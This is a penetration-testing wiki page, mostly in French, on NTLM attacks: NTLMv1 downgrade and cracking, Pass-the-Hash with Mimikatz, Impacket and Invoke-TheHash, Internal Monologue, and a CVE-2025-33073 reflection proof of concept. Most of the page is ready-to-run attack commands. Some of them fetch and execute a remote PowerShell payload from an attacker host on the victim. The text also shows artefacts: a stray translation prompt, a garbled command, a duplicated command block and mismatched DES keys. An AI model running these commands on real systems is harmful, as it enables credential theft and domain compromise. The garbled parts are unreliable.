# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Informations de base

Dans les environnements où **Windows XP et Server 2003** sont en service, les hachages LM (Lan Manager) sont utilisés, bien qu'il soit largement reconnu qu'ils peuvent être facilement compromis. Un hachage LM particulier, `AAD3B435B51404EEAAD3B435B51404EE`, indique un scénario où LM n'est pas employé, représentant le hachage d'une chaîne vide.

Par défaut, le protocole d'authentification **Kerberos** est la méthode principale utilisée. NTLM (NT LAN Manager) intervient dans des circonstances spécifiques : absence d'Active Directory, inexistence du domaine, dysfonctionnement de Kerberos en raison d'une mauvaise configuration, ou lorsque les connexions sont tentées à l'aide d'une adresse IP plutôt que d'un hostname valide.

La présence de l'en-tête **"NTLMSSP"** dans les paquets réseau signale un processus d'authentification NTLM.

La prise en charge des protocoles d'authentification - LM, NTLMv1 et NTLMv2 - est assurée par une DLL spécifique située dans `%windir%\Windows\System32\msv1\_0.dll`.

**Points clés** :

- Les hachages LM sont vulnérables et un hachage LM vide (`AAD3B435B51404EEAAD3B435B51404EE`) signifie qu'il n'est pas utilisé.
- Kerberos est la méthode d'authentification par défaut, avec NTLM utilisé uniquement dans certaines conditions.
- Les paquets d'authentification NTLM sont identifiables grâce à l'en-tête "NTLMSSP".
- Les protocoles LM, NTLMv1 et NTLMv2 sont pris en charge par le fichier système `msv1\_0.dll`.

## LM, NTLMv1 and NTLMv2

Vous pouvez vérifier et configurer quel protocole sera utilisé :

### GUI

Exécutez _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Il existe 6 niveaux (de 0 à 5).

![](<../../images/image (919).png>)

### Registry

Cela définira le niveau 5 :
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valeurs possibles :
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Schéma de base de l’authentification NTLM Domain

1. L’**utilisateur** introduit ses **credentials**
2. La machine cliente **envoie une requête d’authentification** en envoyant le **nom de domaine** et le **username**
3. Le **server** envoie le **challenge**
4. Le **client encrypts** le **challenge** en utilisant le hash du password comme clé et l’envoie en réponse
5. Le **server envoie** au **Domain controller** le **nom de domaine, le username, le challenge et la response**. S’il **n’y a pas** de Active Directory configuré ou si le nom de domaine est le nom du server, les credentials sont **vérifiés localement**.
6. Le **domain controller vérifie si tout est correct** et envoie l’information au server

Le **server** et le **Domain Controller** sont capables de créer un **Secure Channel** via le serveur **Netlogon**, car le Domain Controller connaît le password du server (il est dans la base de données **NTDS.DIT**).

### Schéma d’authentification NTLM local

L’authentification est la même que celle mentionnée **before but** le **server** connaît le **hash de l’utilisateur** qui essaie de s’authentifier dans le fichier **SAM**. Donc, au lieu de demander au Domain Controller, le **server vérifiera lui-même** si l’utilisateur peut s’authentifier.

### Challenge NTLMv1

La **longueur du challenge est de 8 bytes** et la **response** a une **longueur de 24 bytes**.

Le **hash NT (16bytes)** est divisé en **3 parties de 7bytes chacune** (7B + 7B + (2B+0x00\*5)) : la **dernière partie est remplie avec des zéros**. Ensuite, le **challenge** est **chiffré séparément** avec chaque partie et les **bytes chiffrés résultants** sont **assemblés**. Total : 8B + 8B + 8B = 24Bytes.

**Problèmes** :

- Manque d’**aléa**
- Les 3 parties peuvent être **attaquées séparément** pour trouver le NT hash
- **DES est crackable**
- La 3º key est toujours composée de **5 zéros**.
- Pour un **même challenge**, la **response** sera la **même**. Donc, vous pouvez donner comme **challenge** à la victime la chaîne "**1122334455667788**" et attaquer la response en utilisant des **rainbow tables précomputées**.

### Attaque NTLMv1

Aujourd’hui, il devient moins courant de trouver des environnements avec Unconstrained Delegation configuré, mais cela ne veut pas dire que vous ne pouvez pas **abuse a Print Spooler service** configuré.

Vous pourriez abuse certains credentials/sessions que vous avez déjà sur l’AD pour **demander à l’imprimante de s’authentifier** contre un **host sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **définir le challenge d’authentification sur 1122334455667788**, capturer la tentative d’authentification, et si elle a été effectuée en **NTLMv1**, vous pourrez la **crack**.\
Si vous utilisez `responder`, vous pouvez essayer d’**utiliser le flag `--lm`** pour tenter de **downgrade** l’**authentification**.\
_Remarque : pour cette technique, l’authentification doit être effectuée en NTLMv1 (NTLMv2 n’est pas valide)._

Rappelez-vous que l’imprimante utilisera le computer account pendant l’authentification, et les computer accounts utilisent des **passwords longs et aléatoires** que vous ne pourrez **probablement pas crack** avec des **dictionaries** courants. Mais l’authentification **NTLMv1** utilise **DES** ([plus d’infos ici](#ntlmv1-challenge)), donc en utilisant certains services spécialement dédiés au cracking de DES, vous pourrez la crack (vous pouvez utiliser par exemple [https://crack.sh/](https://crack.sh) ou [https://ntlmv1.com/](https://ntlmv1.com)).

### Attaque NTLMv1 avec hashcat

NTLMv1 peut aussi être cassé avec le NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) qui formate les messages NTLMv1 d’une manière qui peut être cassée avec hashcat.

La commande
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
produiraient la sortie ci-dessous :
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Veuillez fournir le contenu à traduire.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Exécutez hashcat (le mode distribué est préférable via un outil comme hashtopolis) car cela prendra sinon plusieurs jours.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Dans ce cas, nous connaissons le mot de passe, qui est password, donc nous allons tricher à des fins de démonstration :
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Nous devons maintenant utiliser les hashcat-utilities pour convertir les clés des en dés crackées en parties du hash NTLM :
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Enfin la dernière partie :
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Combine them together:
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

La **longueur du challenge est de 8 octets** et **2 responses sont envoyées** : l’une fait **24 octets** et la longueur de **l’autre** est **variable**.

**La première response** est créée en chiffrant avec **HMAC_MD5** la **chaîne** composée par le **client and the domain** et en utilisant comme **key** le **hash MD4** du **NT hash**. Ensuite, le **résultat** sera utilisé comme **key** pour chiffrer avec **HMAC_MD5** le **challenge**. À cela, **un client challenge de 8 octets sera ajouté**. Total : 24 B.

**La seconde response** est créée en utilisant **plusieurs valeurs** (un nouveau client challenge, un **timestamp** pour éviter les **replay attacks**...)

Si vous avez un **pcap qui a capturé un processus d’authentification réussi**, vous pouvez suivre ce guide pour obtenir le domain, username, challenge et response et essayer de creak le password : [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Une fois que vous avez le hash de la victime**, vous pouvez l’utiliser pour **l’usurper**.\
Vous devez utiliser un **outil** qui **effectuera** l’**authentification NTLM en utilisant** ce hash, **ou** vous pouvez créer une nouvelle **sessionlogon** et **injecter** ce hash dans le **LSASS**, afin que lorsque toute **authentification NTLM** est effectuée, **ce hash soit utilisé.** La dernière option est ce que fait mimikatz.

**Veuillez noter que vous pouvez aussi effectuer des attaques Pass-the-Hash en utilisant des Computer accounts.**

### **Mimikatz**

**Doit être exécuté en tant qu’administrateur**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).

### Pass-the-Hash from linux

You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- There are several more Impacket binaries...

### Invoke-TheHash

You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Cette fonction est un **mélange de toutes les autres**. Vous pouvez passer **plusieurs hôtes**, **exclure** certains et **sélectionner** l’**option** que vous voulez utiliser (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si vous sélectionnez **l’un** de **SMBExec** et **WMIExec** mais que vous ne fournissez **pas** de paramètre _**Command**_, elle va simplement **vérifier** si vous avez **suffisamment de permissions**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Doit être exécuté en tant qu’administrateur**

Cet outil fera la même chose que mimikatz (modifier la mémoire LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Exécution distante Windows manuelle avec username et password


{{#ref}}
../lateral-movement/
{{#endref}}

## Extraction de credentials depuis un Windows Host

**Pour plus d'informations sur** [**comment obtenir des credentials depuis un Windows host, vous devriez lire cette page**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Attaque Internal Monologue

L'attaque Internal Monologue est une technique discrète d'extraction de credentials qui permet à un attaquant de récupérer des NTLM hashes depuis la machine d'une victime **sans interagir directement avec le processus LSASS**. Contrairement à Mimikatz, qui lit les hashes directement depuis la mémoire et est souvent bloqué par les solutions de sécurité endpoint ou Credential Guard, cette attaque exploite **des appels locaux au package d'authentification NTLM (MSV1_0) via l'interface Security Support Provider Interface (SSPI)**. L'attaquant **abaisse d'abord les paramètres NTLM** (par ex. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) pour s'assurer que NetNTLMv1 est autorisé. Il usurpe ensuite les jetons utilisateur existants obtenus à partir de processus en cours d'exécution et déclenche une authentification NTLM locale pour générer des réponses NetNTLMv1 en utilisant un challenge connu.

Après avoir capturé ces réponses NetNTLMv1, l'attaquant peut rapidement retrouver les NTLM hashes originaux à l'aide de **rainbow tables précomputées**, ce qui permet d'autres attaques Pass-the-Hash pour le lateral movement. Point crucial, l'attaque Internal Monologue reste discrète car elle ne génère pas de trafic réseau, n'injecte pas de code, et ne déclenche pas de dumps mémoire directs, ce qui la rend plus difficile à détecter pour les défenseurs que des méthodes traditionnelles comme Mimikatz.

Si NetNTLMv1 n'est pas accepté — en raison de politiques de sécurité appliquées, alors l'attaquant peut ne pas parvenir à récupérer une réponse NetNTLMv1.

Pour gérer ce cas, l'outil Internal Monologue a été mis à jour : il acquiert dynamiquement un server token via `AcceptSecurityContext()` pour toujours **capturer des réponses NetNTLMv2** si NetNTLMv1 échoue. Bien que NetNTLMv2 soit beaucoup plus difficile à crack, il ouvre quand même une voie pour des relay attacks ou du brute-force offline dans certains cas limités.

Le PoC se trouve dans **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay et Responder

**Lisez ici un guide plus détaillé sur la manière d'effectuer ces attaques :**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Analyser les challenges NTLM depuis une capture réseau

**Vous pouvez utiliser** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows contient plusieurs mitigations qui tentent d'empêcher les attaques de *reflection* où une authentification NTLM (ou Kerberos) qui provient d'un host est relayée vers le **même** host pour obtenir des privilèges SYSTEM.

Microsoft a cassé la plupart des chaînes publiques avec MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) et des correctifs ultérieurs, cependant **CVE-2025-33073** montre que les protections peuvent encore être contournées en abusant de la manière dont le **client SMB tronque les Service Principal Names (SPNs)** qui contiennent des target-info *marshalled* (sérialisées).

### TL;DR du bug
1. Un attaquant enregistre un **DNS A-record** dont le label encode un SPN marshalled — par ex.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. La victime est forcée à s'authentifier vers ce hostname (PetitPotam, DFSCoerce, etc.).
3. Lorsque le client SMB passe la chaîne cible `cifs/srv11UWhRCAAAAA…` à `lsasrv!LsapCheckMarshalledTargetInfo`, l'appel à `CredUnmarshalTargetInfo` **supprime** le blob sérialisé, laissant **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ou l'équivalent Kerberos) considère maintenant que la cible est *localhost* parce que la partie courte du host correspond au nom de l'ordinateur (`SRV1`).
5. Par conséquent, le server définit `NTLMSSP_NEGOTIATE_LOCAL_CALL` et injecte le **jeton d'accès SYSTEM de LSASS** dans le contexte (pour Kerberos, une subsession key marquée SYSTEM est créée).
6. Relayer cette authentification avec `ntlmrelayx.py` **ou** `krbrelayx.py` donne des droits SYSTEM complets sur le même host.

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* Le patch KB pour **CVE-2025-33073** ajoute une vérification dans `mrxsmb.sys::SmbCeCreateSrvCall` qui bloque toute connexion SMB dont la cible contient des infos marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Imposer la **SMB signing** pour empêcher la reflection même sur des hôtes non patchés.
* Surveiller les enregistrements DNS ressemblant à `*<base64>...*` et bloquer les vecteurs de coercition (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Captures réseau avec `NTLMSSP_NEGOTIATE_LOCAL_CALL` où l’IP client ≠ l’IP serveur.
* Kerberos AP-REQ contenant une subsession key et un principal client égal au hostname.
* Windows Event 4624/4648 SYSTEM logons immédiatement suivis par des écritures SMB distantes depuis le même hôte.

Pour la variante de **mars 2026** de reflection locale qui abuse des **SMB arbitrary ports** et de la **TCP connection reuse** pour atteindre `NT AUTHORITY\SYSTEM`, voir :

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
